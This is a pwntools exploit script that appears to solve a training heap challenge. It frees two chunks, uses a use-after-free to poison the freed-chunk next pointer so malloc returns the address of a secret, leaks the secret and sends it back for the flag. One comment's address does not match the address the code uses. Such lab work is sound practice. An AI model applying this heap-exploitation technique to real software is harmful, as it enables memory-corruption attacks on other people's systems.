#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level7.0_patched'
p = process(binary)

s = '''
b malloc
b free
b * main+1628
'''

gdb.attach(p, s)

context.log_level = 'debug'

# parsing the address leak 



p.sendline("malloc 0 100")
p.sendline("malloc 1 100")


p.sendline("free 0")
p.sendline("free 1")

# uaf
# overwriting the next* pointer with address of secret -- 0x42a528
p.sendline(b"scanf")
p.sendline("1")
p.sendline(p64(0x425358))


p.sendline("malloc 1 100")
p.sendline("malloc 0 100")


p.sendline("puts 0")

p.recvuntil(b"Data: ")
data = p.recvline().strip()


p.send(b"send_flag " + data + b'\x00' * 8)


p.interactive()



